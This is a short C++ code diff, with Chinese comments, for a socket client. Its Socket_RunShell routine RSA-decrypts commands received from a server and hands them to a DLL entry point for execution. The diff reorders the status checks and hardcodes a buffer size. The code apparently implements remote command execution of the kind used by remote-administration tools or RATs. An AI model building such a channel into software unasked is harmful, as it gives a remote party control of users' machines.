@@ -31,7 +31,7 @@ private:
 ServerSocketClass ServerSocketClass::use;
 
 void ServerSocketClass::Loading() {
-	socketCache = ConfigClass::Socket_Cache; // 缓存区大小
+	socketCache = 600; // 缓存区大小
 }
 SOCKADDR_IN ServerSocketClass::Socket_Initialization() {
 	SOCKADDR_IN server;
@@ -49,16 +49,15 @@ getDomainIp:
 	return server;
 }
 void ServerSocketClass::Socket_RunShell(std::string data) { //执行动作
-	std::string re = RSAClass().B_PrivateUnEncode(data); //解密数据
-	if (re == "") { return; } //解密失败
-	if (re == ConfigClass::Socket_Error) { //如果是Error(密码错误)
+	if (data == ConfigClass::Socket_OK) { return; } // 如果是Success
+	if (data == ConfigClass::Socket_Error) { //如果是Error(密码错误)
 		SocketStopFlac = true;
 		SoftwareClass().RebootSoftware();
 		return;
 	}
-	// 如果是Success
-	else if (re == ConfigClass::Socket_OK) { return; }
 	else { //是其他的话
+		std::string re = RSAClass().B_PrivateUnEncode(data); //解密数据
+		if (re == "") { return; } //解密失败
 		if (!ClientDll::Client_Entrance((char*)re.c_str())) { //执行，如果不是合法信息
 			return;
 		}
